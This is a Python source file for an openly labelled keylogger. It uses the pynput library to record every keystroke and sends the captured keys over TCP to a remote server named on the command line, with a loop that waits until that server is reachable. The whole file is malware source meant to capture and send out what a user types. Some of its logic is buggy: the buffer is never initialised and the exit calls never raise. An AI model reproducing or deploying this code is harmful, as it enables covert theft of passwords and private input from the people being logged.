#!/usr/bin/env python
import socket
import sys
import time
from pynput import keyboard

# get the server IP and port from the command-line arguments
ip = sys.argv[1]
port = int(sys.argv[2])

# check if the server is up
def check_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a socket object for TCP/IP communication
    s.settimeout(1) # set a timeout for the socket operation
    try:
        s.connect((ip, port)) # try to connect to the server
        s.close() # close the socket
        return True # return True if the server is up and reachable
    except:
        return False # return False if the server is not reachable

# send the keys to the server
def send_keys(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a new socket object for TCP/IP communication
    s.connect((ip, port)) # connect to the server
    if len(buffer) == 8: # if the buffer is full
        s.send(buffer.encode()) # send the buffer to the server
        buffer = '' # clear the buffer
            
    if len(buffer) > 0: # if there are remaining characters in the buffer
        s.send(buffer.encode()) # send the remaining characters to the server
        
    print(f"sent keys: {buffer}") # print the sent keys
    s.close() # close the socket


# the keylogger function
def on_press(key):
    # define a variable to store the pressed keys even if the function is called multiple times
    global buffer
    try:
        buffer += key.char # add the pressed key to the buffer
        print(f"pressed key: {key.char}") # print the pressed key
        if key.char == '\x03':
            # if the user pressed Ctrl+C, stop the keylogger
            SystemExit(0)
        elif key.char == '\x04':
            # if the user pressed Ctrl+D, stop the keylogger
            SystemExit(0)
        # if it enter or backspace, send the buffer to the server
        elif key.char == '\r' or key.char == '\x08':
            send_keys(buffer)
            buffer = ''
        # if the buffer is full, send the buffer to the server
        elif len(buffer) == 8:
            send_keys(buffer)
            buffer = ''
        
    
        
    except AttributeError:
        buffer += key.name
        print(f"pressed key: {key.name}") # print the pressed key
    send_keys(buffer) # send the pressed key to the server

# main function
if __name__ == "__main__":
    while True:
        if check_server(): # check if the server is up
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join() # start the keylogger
        else:
            print("server is down") # print a message if the server is not up
            time.sleep(1) # wait for 1 second before checking the server again
